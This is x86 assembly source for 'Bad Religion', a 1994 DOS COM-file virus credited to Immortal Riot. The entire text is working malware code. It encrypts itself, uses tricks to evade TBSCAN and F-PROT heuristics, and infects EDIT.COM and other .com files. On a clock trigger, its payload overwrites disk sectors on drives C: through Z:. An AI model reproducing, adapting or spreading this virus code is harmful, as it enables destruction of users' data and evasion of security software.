; ------------------------------------------------------------------------------
;
;                        - Bad Religion -
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot 
;
; ------------------------------------------------------------------------------
;               þ Undetectable/Destructive COM-infector þ
; ------------------------------------------------------------------------------
.model tiny
.radix 16
.code
org    100h

start:

storbuf db 00,00,00,00            ; for first generation only!

v_start:

mov     sp,102h                   ; get the delta offset so tbscan cant
call    get_delta                 ; flag it as flexible entry point
get_delta:                        ; 
mov     bp,word ptr ds:[100h]      
mov     sp,0fffeh                  
sub     bp,offset get_delta       

go_back:

mov     ax,0305h                  ; this code was included to avoid detection
xor     bx,bx                     ; from tbscan. The vsafe disabeling code can
int     16h                       ; be used as well, but f-prot heuristics
				  ; complains about it.
				 
call    en_de_crypt               ; decrypt the virus
jmp     short real_start          ; and continue...

encrypt_value dw 0                ; random xor (encryption) value 

write_virus:

call    en_de_crypt               ; write encrypted copy of the virus
mov     ah,40                     ; 
mov     cx,code_end-v_start       ; # bytes
lea     dx,[bp+v_start]           ; dx:100h         
int     21                        ;
call    en_de_crypt               ; decrypt virus again for further processing
ret

en_de_crypt:

mov     ax,word ptr [bp+encrypt_value]       
lea     si,[bp+real_start]                        
mov     cx,(enc_end-real_start+1)/2

xor_loopie:

xor     word ptr [si],ax          ; encrypts two bytes/loop until all 
inc     si                        ; code between real_start and enc_end
inc     si                        ; are encrypted
loop    xor_loopie
ret

real_start:
mov     ah,2ch                    ; get time of 1/100 of a second value from
int     21h                       ; the system clock

cmp     dl,58d                    ; value == 58d
jne     get_drive                 ; nope!

mov al,2

drive:                            ; routine to overwrite all sectors
mov     cx,1                      ; on all drives from drive C-Z:            
lea     bx,[bp+v_name]            ;
cwd
Next_Sector:                      
int     26h                                                               
inc     dx              
jnc     next_sector                                                        
inc     al                      
jmp     short drive

get_drive:                        

mov     ah,19h                    ; get drive from where we are executed from
int     21h                       ; check if it's a: or b:
cmp     al,2                      ; if so, return control to the original
jb      quit                      ; program without infecting other files

lea     si,[bp+org_buf]           ; copy the first four bytes
mov     di,100                    ; of the file, into a buffer          
movsw                             ; called org_buf
movsw                             ;              

lea     dx,[bp+code_end]          ; set our own dta to code_end, so
mov     ah,1ah                    ; the paramters when findfiles arent
int     21h                       ; destroyed

lea     dx,[bp+direct_infect]     ; if present, infect
call    dirinfect                 ; \dos\edit.com

mov     ah,4e                     ; search for com files
lea     dx,[bp+com_files]         ; 
find_next:
int     21

jc      no_more_files             ; no more files find, exit!
call    infect                    ; found a find, infect it!

mov     ah,4f                     ; search next file
jmp     short find_next           ; and see if we find one

no_more_files:                    ;
mov     dx,80                     ; set the dta to 80h (default)          
mov     ah,1ah
int     21h

quit:                             ;
mov     di,100                    ; return control to original program     
push    di                        ; 
ret                                           

infect:
lea     dx,[bp+code_end+1e]       ; 1e = adress to filename in ds:dx in our 
				  ; new dta area!
dirinfect:

mov     ax,3d02                   ; open file 
int     21                        ; in read/write mode

jnc     infect_it                 ; if the file \dos\edit.com doesnt exist
ret                               ; return, and search first comfile

infect_it:
xchg    bx,ax                     ; filehandle in bx

mov     ax,5700                   ; get time/date
int     21

push    dx                        ; save date
push    cx                        ; save time

mov     ah,3f                     ; read the first four bytes
mov     cx,4                      ; of the file to org_buf
lea     dx,[bp+org_buf]  
int     21                                     

cmp     byte ptr [bp+org_buf+3],03h            ; previous infected (heart)
jz      finish_infect                          ; 

cmp     word ptr [bp+org_buf],9090h            ; double nop
jz      finish_infect                          ; 

cmp     word ptr [bp+org_buf],5a4dh            ; ZM (exe file)
jz      finish_infect                          ;

cmp     word ptr [bp+org_buf],4d5ah            ; MZ (exe-file)
jz      finish_infect                          ;
						
cmp     byte ptr [bp+org_buf+1],6Dh            ; command.com
jz      finish_infect                          ;

mov     ax, word ptr [bp+code_end+1ah]         ; virus size * 2
cmp     ax,762d                                ;
jb      finish_infect

cmp     ax,65156d                              ; 1024 * 64 - virus size
ja      finish_infect                          ;

mov     ax,4202                                ; move file-pointer
xor     cx,cx                                  ; to end of file
cwd
int     21

sub     ax,3                                   ; substract bytes
mov     word ptr [bp+first_four+1],ax          ; to our own jump

get_value:

mov     ah,2ch                                 ; get system clock for
int     21h                                    ; 1/100 of a second
jz      get_value                              ; if zero = get new value
mov     word ptr [bp+encrypt_value],dx         ; otherwise, use as enc value
call    write_virus                            ; write virus to end of file

mov     ax,4200                   ; move file-pointer to
xor     cx,cx                     ; top of file
cwd
int     21

mov     ah,40                     ; write our own jump  
mov     cx,4                      ; instruction to the
lea     dx,[bp+first_four]        ; beginning
int     21                                               

finish_infect:                                 
mov     ax,5701                   ; set back
pop     cx                        ; time
pop     dx                        ; date
int     21                        ; 

mov     ah,3e                     ; close file
int     21

ret                               ; return and continue!

v_name           db   "[Bad Religion] (c) 1994 The Unforgiven/Immortal Riot"

direct_infect    db      '\DOS\EDIT.COM',0                         

com_files        db      '*.com',0                 
first_four       db      0e9,90,90,03    ; buffer to calculate a new entry
org_buf:         db      90,90,0CDh,20   ; buffer to save first four bytes in

enc_end:         
code_end:
end start
